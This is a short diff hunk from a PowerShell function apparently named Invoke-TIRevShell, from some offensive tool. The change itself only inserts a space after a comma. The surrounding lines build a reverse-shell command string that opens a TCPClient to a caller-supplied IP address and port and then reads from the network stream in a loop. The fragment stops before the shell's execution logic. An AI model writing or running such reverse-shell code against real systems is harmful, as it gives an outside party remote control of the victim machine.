@@ -34,7 +34,7 @@ function Invoke-TIRevShell {
 
     $shell = '$client = New-Object System.Net.Sockets.TCPClient('
     $shell += $IP
-    $shell += ','
+    $shell += ', '
     $shell += ''
     $shell += $Port
     $shell += ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)'
